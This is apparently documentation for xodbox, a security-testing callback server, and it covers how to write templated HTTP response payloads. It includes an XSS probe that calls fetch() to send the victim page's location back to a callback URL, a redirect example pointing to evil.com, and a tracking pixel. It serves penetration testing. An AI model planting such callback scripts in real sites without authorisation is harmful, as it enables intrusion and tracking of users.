---
title: HTTP Payloads
description: Create, configure, and hot-reload custom HTTP response payloads
weight: 30
---

The HTTPX handler serves user-defined **payloads** — configurable HTTP
responses keyed by URL pattern. Payloads use Go templates for dynamic
headers, bodies, and status codes, letting you craft responses that test
how an application consumes remote data.

## How payloads work

Payloads form a **processing chain**, not a simple route table. On each
request:

1. All payloads are evaluated in order of `weight` (ascending), then by
   pattern.
2. Every payload whose `pattern` regex matches `r.URL.Path` runs — it can
   set headers, write a body, or set the status code.
3. If a payload has `is_final: true`, processing stops. Otherwise, the
   next matching payload runs.

This means multiple non-final payloads can contribute to a single
response. For example, the built-in `Default Header` payload (weight
-1000) adds a `Server` header to every response, then processing
continues to the content payload.

## Payload file format

Payloads are defined as Markdown files with YAML frontmatter. The body
below the closing `---` is documentation only — it is not used at
runtime.

```yaml
---
title: My Payload
description: Returns a custom JSON response
weight: 100
pattern: ^/api/config
is_final: true
data:
  status_code: "200"
  headers:
    content-type: application/json
  body: |
    {"server": "{{.Request.Host}}", "ip": "{{index .Request.RemoteAddr 0}}"}
---

This payload returns a fake JSON config to test how the target parses
remote configuration files.
```

### Frontmatter fields

| Field | Required | Default | Description |
|-------|----------|---------|-------------|
| `title` | yes | — | Unique name for the payload. |
| `description` | no | — | Human-readable description. |
| `weight` | no | 0 | Evaluation order (lower = earlier). Use negative values to run before defaults. |
| `pattern` | yes | — | Go regular expression matched against the URL path. |
| `is_final` | no | `false` | When true, stops the payload chain after this payload. |
| `internal_function` | no | — | Invokes a built-in Go function instead of the body template (`inspect` or `build`). |
| `data.status_code` | no | — | Go template for the HTTP status code. |
| `data.headers` | no | — | Map of header name to value. Both names and values are Go templates. |
| `data.body` | no | — | Go template for the response body. |

## Template context

All template fields (headers, body, status code) are Go templates with
[Sprig](http://masterminds.github.io/sprig/) functions available (minus
`env` and `expandenv` for security).

| Variable | Type | Description |
|----------|------|-------------|
| `.Version` | `string` | xodbox version |
| `.ServerName` | `string` | Configured server name |
| `.CallBackURL` | `string` | URL that calls back to xodbox with `?&xdbx` |
| `.CallBackImageURL` | `string` | Same but with `?&xdbxImage` |
| `.Extra` | `map[string]string` | Template data plus `GET_<param>` entries |
| `.Payloads` | `[]Payload` | All loaded payloads |
| `.Request.RemoteAddr` | `[]string` | Client IPs (including X-Forwarded-For, X-Real-IP) |
| `.Request.Host` | `string` | Request host |
| `.Request.Path` | `string` | URL path |
| `.Request.UserAgent` | `string` | User-Agent header |
| `.Request.Headers` | `map[string][]string` | All request headers |
| `.Request.GetParams` | `url.Values` | Query string parameters |
| `.Request.PostParams` | `url.Values` | POST form parameters |
| `.Request.Body` | `[]byte` | Raw request body |
| `.Request.FullRequest` | `[]byte` | Full raw HTTP request |

### Content-type and escaping

When a payload sets `Content-Type: text/html`, the body is rendered with
Go's `html/template` (auto-escapes HTML entities). All other content
types use `text/template` (no escaping), so template output is rendered
verbatim.

## Loading payloads

### Embedded seeds

xodbox ships with built-in payloads compiled into the binary. These are
loaded on first startup and include:

- **Default Header** (weight -1000): adds a `Server` header to every
  response.
- **Robots** (weight -900): serves `robots.txt`.
- **Redirect** (weight -900): HTTP redirects via `/redir?l=URL&s=301`.
- **Inspect** (weight -500): reflects requests back in multiple formats
  (`.txt`, `.html`, `.json`, `.xml`, `.js`, `.png`, `.gif`, `.jpg`).
- **MDaaS Build** (weight -500): cross-compiles binaries on the fly.
- **Default Page** (weight 9999): catch-all HTML page.

Seeds are additive — they are inserted on first run but never overwrite
existing payloads with the same name.

### Payload directory (hot-reload)

Set `payload_dir` in the HTTPX handler config to load `.md` payload files
from a directory:

```yaml
handlers:
  - handler: HTTPX
    listener: :80
    payload_dir: /opt/xodbox/payloads
```

xodbox watches this directory with `fsnotify`:

- New or modified `.md` files are **upserted** (inserted or updated by
  name) with a 1-second debounce.
- Subdirectories are also watched.
- Files ending in `~` and files named `_index.md` are ignored.
- Changes take effect on the next HTTP request after the upsert.

### Admin UI and API

Payloads can also be managed through the admin web UI (Payloads page) or
the JSON API:

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `GET` | `/api/payloads` | any user | List all payloads |
| `GET` | `/api/payloads/{id}` | any user | Get one payload |
| `POST` | `/api/payloads` | admin | Create a payload |
| `PUT` | `/api/payloads/{id}` | admin | Update a payload |
| `DELETE` | `/api/payloads/{id}` | admin | Delete a payload |

### CLI

```sh
xodbox payload dump   # dump all payloads as YAML
```

## Examples

### XSS probe

```yaml
---
title: XSS Probe
description: JavaScript that phones home on execution
weight: 100
pattern: ^/xss
is_final: true
data:
  headers:
    content-type: application/javascript
    access-control-allow-origin: "*"
  body: |
    fetch("{{.CallBackURL}}&context=xss&origin="+document.location.href)
---
```

### Redirect with custom status

The built-in redirect payload (`/redir`) supports dynamic status codes
and locations via query parameters:

```
/redir?l=https://evil.com&s=302
```

- `l` — redirect location (defaults to a rickroll)
- `s` — HTTP status code (defaults to 301)

### Request inspector

The built-in inspect payload reflects the request back at the requested
path with a format suffix:

```
/i/anything.json   → JSON representation of the request
/i/anything.html   → HTML view
/i/anything.txt    → plain text
/i/anything.xml    → XML
/i/anything.js     → JavaScript (document.write)
/i/anything.png    → 1x1 tracking pixel
```

### Dynamic header names

Header keys are also templates, enabling dynamic headers:

```yaml
data:
  headers:
    "x-{{index .Request.GetParams \"h\" 0}}": "{{index .Request.GetParams \"v\" 0}}"
```

A request to `/?h=custom&v=value` produces `X-custom: value`.

## Built-in weight conventions

| Weight | Purpose |
|--------|---------|
| -1000 | Global headers (applied to every response) |
| -900 | Utility routes (robots.txt, redirects) |
| -500 | Built-in tools (inspect, build) |
| 0 | Default for user payloads |
| 9999 | Catch-all fallback page |

Place your payloads between -499 and 9998 to run after built-in utilities
but before the catch-all. Use negative weights to add global headers or
middleware-like behavior.
